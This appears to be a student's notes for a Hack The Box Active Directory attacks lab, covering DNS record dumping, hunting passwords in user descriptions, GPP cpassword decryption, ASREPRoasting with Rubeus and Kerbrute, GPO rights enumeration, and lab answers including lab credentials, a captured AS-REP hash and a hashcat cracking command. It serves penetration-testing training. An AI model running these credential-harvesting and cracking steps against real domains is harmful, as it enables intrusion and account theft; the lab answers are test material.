

## Enumerating DNS Records

>[!info]
>A tool such as adidnsdump can enumerate all DNS records in a domain using a valid domain user account


##### Using adidnsdump
```go
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

##### Viewing the Contents of the records.csv File
```go
head records.csv
```

##### Using the -r Option to Resolve Unknown Records
```go
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

##### Finding Passwords in the Description Field using Get-Domain User
```go
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

##### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```go
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```



## Group Policy Preferences (GPP) Passwords

>[!info]
> When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.
> 
> These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share
> 
> If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password

##### Decrypting the Password with gpp-decrypt
```go
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

>[!hint] 
> GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as:
> - PowerSploit's [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
> - the GPP Metasploit Post Module
> - CrackMapExec
> - Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value

##### Locating & Retrieving GPP Passwords with CrackMapExec
```go
crackmapexec smb -L | grep gpp
```


>[!info] Registry.xml
> If the Registry.xml file is set via Group Policy and not locally on the host, then anyone on the domain can retrieve the credentials stored in the Registry.xml file.
> 
> Hunt for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

##### Using CrackMapExec's gpp_autologin Module
```go
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## ASREPRoasting

>[!info]
>The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
> 
> The Domain Controller will decrypt the pre-authenticated user password. If successful, a TGT will be issued to the user. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.
> 
> An attacker with `GenericWrite` or `GenericAll` permissions over an account can enable the `DONT_REQ_PREAUTH` attribute and obtain the AS-REP ticket for offline cracking.
> 



>[!HINT] ASREPRoasting Can be Performed with the Following Tools
> - Rubeus
> - Kerbrute

>[!warning] ASREP Hashcat Cracking Mode
> Use Hashcat's mode 18200

##### Using PowerView - Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```go
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

##### Retrieving AS-REP in Proper Format using Rubeus
```go
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

##### Retrieving the AS-REP Using Kerbrute
```go
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

##### Hunting for Users with Kerberos Pre-auth Not Required
```go
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```


--------------------------------------------------

## Group Policy Object Abuse

##### Enumerating GPO Names with PowerView

```go
Get-DomainGPO |select displayname
```

##### Enumerating GPO Names with a Built-In Cmdlet
```go
Get-GPO -All | Select DisplayName
```

##### Enumerating Domain User GPO Rights
```go
$sid=Convert-NameToSid "Domain Users"
```

```go
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

##### Converting GPO GUID to Name
```go
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```


---------------------

# Questions

RDP
```go
xfreerdp /v:10.129.77.36 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/misc /smart-sizing:2400x1200 /cert:ignore
```



#### Question 1:  Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

Answer
```go
ygroce
```


```go
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

#### Question 2: Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

Answer
```go

```

![[Pasted image 20260505210846.png]]

##### Retrieve AESRep-Roast via Rubeus
```go
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Hash
```go
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:27E33D3417538ED593B8592729AF50ED$BB08CBE9BE4B0FF90D884BC9098968DEB6B98E90DB8D167844297B7848FAD13FAF7B83199C0B19DFC23913240736EDB85A5BFFE0FEC4C663666A14FABAB8EB7FB92F6F9549D96020C312961E60E9210F232DCB5BD4569A6478BB650818FCF6CC61DB011132028D93DEB18B691066FE065E731727AFE287AEE2AC9080D739B5E01EDDD5AD4B88767C480E4EA44F09DBEFFEDAE3C3A2DA725D462437DB650740E75AC11B562BBE141FDEA040D8AEE8F3564950C567B91E0539EDE64918D476CB8E223DAC1654DA359399429DA5CBA1B732C971128E529EAEE6E05C3F9F5ADC0AF68377048C8E4DDE12F0DFBB1DA914A102AF57F8D88332AE7A9ABB
```

Crack with Hashcat. Remember to specify 18200 for the AS-Rep
```go
hashcat -m 18200 inlanefreight_hash /usr/share/wordlists/rockyou.txt
```
